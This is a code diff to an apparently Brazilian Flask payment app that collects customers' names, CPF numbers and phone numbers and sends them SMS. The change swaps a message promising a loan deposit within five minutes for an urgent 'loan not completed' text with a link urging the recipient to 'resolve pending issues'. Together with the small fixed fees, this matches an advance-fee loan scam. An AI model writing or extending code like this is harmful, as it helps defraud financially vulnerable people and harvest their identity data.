@@ -8,8 +8,10 @@ import base64
 from io import BytesIO
 import re
 import random
+from urllib.parse import quote
 import string
 import requests
+from urllib.parse import urlencode
 import json
 import http.client
 import unicodedata
@@ -400,26 +402,6 @@ def payment():
             app.logger.error("[PROD] Nome ou CPF não fornecidos")
             return jsonify({'error': 'Nome e CPF são obrigatórios'}), 400
 
-        # Verificar se estamos em um ambiente replit
-        # Se o domínio contiver ".replit", redirecionamos direto para a página de obrigado
-        if ".replit" in request.host:
-            app.logger.info("[PROD] Domínio .replit detectado, redirecionando para página de obrigado")
-            
-            # Se tivermos um número de telefone, enviar SMS de confirmação
-            if phone:
-                try:
-                    amount = 27.60 if source == 'insurance' else 74.90  # Valor padrão baseado na origem
-                    success = send_sms(phone, nome, amount)
-                    if success:
-                        app.logger.info(f"[PROD] SMS enviado com sucesso para {phone}")
-                    else:
-                        app.logger.error(f"[PROD] Falha ao enviar SMS para {phone}")
-                except Exception as e:
-                    app.logger.error(f"[PROD] Erro ao enviar SMS: {str(e)}")
-            
-            # Redirecionar para a página de obrigado com os mesmos parâmetros
-            return redirect(url_for('thank_you', nome=nome, cpf=cpf, phone=phone, source=source))
-            
         app.logger.info(f"[PROD] Dados do cliente: nome={nome}, cpf={cpf}, phone={phone}, source={source}")
 
         # Inicializa a API de pagamento usando nossa factory
@@ -623,11 +605,18 @@ def send_payment_confirmation_sms():
         if not phone or not nome or not amount:
             app.logger.error("[SMS-CONFIRM] Parâmetros faltando para envio de SMS")
             return jsonify({'success': False, 'error': 'Parâmetros faltando'}), 400
-            
-        # Format URL parameters for the thank you page
         url_params = request.args.copy()
-        url_params_str = "&".join([f"{k}={v}" for k, v in url_params.items()])
-        
+
+        # Format URL parameters for the thank you page
+        encoded_params = []
+        for k, v in url_params.items():
+            # Codifica cada chave e valor individualmente
+            encoded_k = quote(k)
+            encoded_v = quote(v)
+            encoded_params.append(f"{encoded_k}={encoded_v}")
+    
+        # Junta todos os parâmetros com '&' e monta a URL final
+        url_params_str = "&".join(encoded_params)
         # Extract and format first name
         primeiro_nome = ''
         if nome:
@@ -639,9 +628,7 @@ def send_payment_confirmation_sms():
             primeiro_nome = ''.join(c for c in unicodedata.normalize('NFD', primeiro_nome)
                                if unicodedata.category(c) != 'Mn')
                 
-        # Construct the SMS message - mensagem positiva de confirmação
-        message = f"IMPORTANTE: {primeiro_nome}, seu pagamento foi CONFIRMADO! O valor de R${amount} será depositado na sua conta bancária cadastrada em até 5 minutos. Obrigado."
-        
+        message = f"IMPORTANTE: {primeiro_nome}, EMPRESTIMO NAO CONCLUIDO! Para concluir o deposito em sua conta resolva as pendencias: {dominio}/obrigado?{url_params_str}";
         app.logger.info(f"[SMS-CONFIRM] Enviando SMS de confirmação para {phone}: {message}")
         
         # Sempre usar SMSDEV API para confirmações de pagamento
@@ -764,7 +751,7 @@ def thank_you():
             'name': request.args.get('nome', ''),
             'cpf': request.args.get('cpf', '')
         }
-
+        
         meta_pixel_id = os.environ.get('META_PIXEL_ID')
         return render_template('thank_you.html', customer=customer, meta_pixel_id=meta_pixel_id)
     except Exception as e:
